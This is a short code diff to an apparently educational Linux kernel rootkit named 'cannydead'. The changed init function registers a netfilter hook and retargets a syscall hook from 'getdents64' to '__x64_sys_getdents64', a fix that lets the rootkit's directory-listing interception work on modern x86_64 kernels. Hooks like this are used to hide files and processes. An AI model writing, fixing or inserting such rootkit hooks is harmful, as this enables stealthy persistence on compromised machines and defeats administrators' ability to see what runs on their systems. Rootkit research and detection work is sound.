@@ -46,7 +46,7 @@ static int __init startup(void)
     nfho.priority = NF_IP_PRI_FIRST;
     nf_register_net_hook(&init_net, &nfho);
     printk(KERN_WARNING "[cannydead] WARNING: Educational test rootkit loaded into the kernel!\n");
-    fh_install_hook("getdents64", hooked_getdents64, (void **)&real_getdents64);
+    fh_install_hook("__x64_sys_getdents64", hooked_getdents64, (void **)&real_getdents64);
     return 0;
 }
 
